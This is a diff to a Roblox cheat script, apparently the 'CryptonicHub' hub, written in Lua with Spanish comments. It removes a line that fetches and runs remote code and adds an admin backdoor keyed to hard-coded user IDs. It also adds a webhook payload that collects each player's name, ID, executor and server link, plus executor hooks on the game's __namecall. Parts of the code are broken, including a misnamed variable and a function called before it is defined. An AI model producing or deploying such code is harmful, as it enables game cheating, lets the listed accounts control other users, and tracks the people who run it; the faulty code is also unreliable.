@@ -1,12 +1,95 @@
-
--- >> Aquí hay locales globales.				<< --
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/martinelcrac/cryptonichub/main/dependencies/library.lua", true))()
-
--- >> Backdoor.							<< --
+-- Backdoor:
 
 local admins = {160135858,1570173214,2312,263961430,2635403611,1891561339}
 local prefix = "c!"
+
+-- Webhook:
+
+local notifyOnExecution = true
+local usingAvatarHeadshotAsPFP = true -- true: grabs user avatar headshot, customPFP not needed. false: set customPFP with a img url
+local scriptName = "CryptonicHub"
+local webhookUsername = game:GetService("Players").LocalPlayer.Name .. " - (#" .. game:GetService("Players").LocalPlayer.userId .. ")"
+local customPFP = "" -- Change this if usingAvatarHeadshotAsPFP is false.
+local color = 0x6AA84F -- Color in HEX
+
+-- >> Aquí empieza todo :)
+
+if usingAvatarHeadshotAsPFP then
+    customPFP = "https://www.roblox.com/Thumbs/Avatar.ashx?x=500&y=500&Format=Png&userId=" .. game:GetService("Players").LocalPlayer.UserId
+end
+
+local data = {
+    ["username"] = webhookUsername,
+    ["avatar_url"] = customPFP,
+    ["embeds"] = {
+        {
+            ["type"] = "rich",
+            ["color"] = tonumber(color),
+            ["fields"] = {
+                {
+                    ["name"] = "Script: " .. ScriptName,
+                    ["value"] = "User: **" ..game:GetService("Players").LocalPlayer.Name .."**\nID: **" ..game:GetService("Players").LocalPlayer.UserId .."**\nExploit: **" ..getexploit() .."**\n[Join Server](https://www.roblox.com/games/" ..game.PlaceId .."/GAME?serverJobId=" ..game.JobId ..")/[Profile](https://www.roblox.com/users/" ..game:GetService("Players").LocalPlayer.UserId .."/profile)",
+                    ["inline"] = true
+                }
+            }
+        }
+    }
+}
+
+
+local function getexploit()
+  local exploit =
+      (syn and not is_sirhurt_closure and not pebc_execute and "Synapse") or
+      (secure_load and "Sentinel") or
+      (iscclosure and "Temple") or
+      (is_sirhurt_closure and "Sirhurt") or
+      (pebc_execute and "ProtoSmasher") or
+      (KRNL_LOADED and "Krnl") or
+      (WrapGlobal and "WeAreDevs") or
+      (isvm and "Proxo") or
+      (shadow_env and "Shadow") or
+      (jit and "EasyExploits") or
+      (getscriptenvs and "Calamari") or
+      (unit and not syn and "Unit") or
+      (OXYGEN_LOADED and "Oxygen U") or
+      (IsElectron and "Electron") or
+      ("Unsupported")
+
+  return exploit
+end
+
+local globalMethods = {
+    checkCaller = checkcaller,
+    newCClosure = newcclosure,
+    hookFunction = hookfunction,
+    getGc = getgc,
+    getInfo = debug.getinfo or getinfo,
+    getSenv = getsenv,
+    getMenv = getmenv or getsenv,
+    getScriptClosure = get_script_function or getscriptclosure,
+    getNamecallMethod = getnamecallmethod,
+    getCallingScript = getcallingscript,
+    getLoadedModules = getloadedmodules or get_loaded_modules,
+    getConstants = debug.getconstants or getconstants or getconsts,
+    getUpvalues = debug.getupvalues or getupvalues or getupvals,
+    getProtos = debug.getprotos or getprotos,
+    getStack = debug.getstack or getstack,
+    getConstant = debug.getconstant or getconstant or getconst,
+    getUpvalue = debug.getupvalue or getupvalue or getupval,
+    getProto = debug.getproto or getproto,
+    getMetatable = getrawmetatable or debug.getmetatable,
+    setClipboard = setclipboard or writeclipboard,
+    setConstant = debug.setconstant or setconstant or setconst,
+    setUpvalue = debug.setupvalue or setupvalue or setupval,
+    setStack = debug.setstack or setstack,
+    setReadOnly = setreadonly,
+    isLClosure = islclosure or (iscclosure and function(closure) return not iscclosure(closure) end),
+    isReadOnly = isreadonly,
+    isXClosure = is_synapse_function or issentinelclosure or is_protosmasher_closure or is_sirhurt_closure or checkclosure
+}
+
+
+-- >> Backdoor.							<< --
 
 local funciones = {}
 
@@ -904,9 +987,9 @@ local function KWOHCO_fake_script() -- cuatro.LocalScript
 
 	
 	script.Parent.MouseButton1Down:Connect(function()
-		local mt = getrawmetatable(game);
+		local mt = getMetatable(game);
 	
-		old = hookfunction(mt.__namecall, function(...)
+		old = hookFunction(mt.__namecall, function(...)
 			local args = {...}
 			local self = args[1]
 			local method = getnamecallmethod();
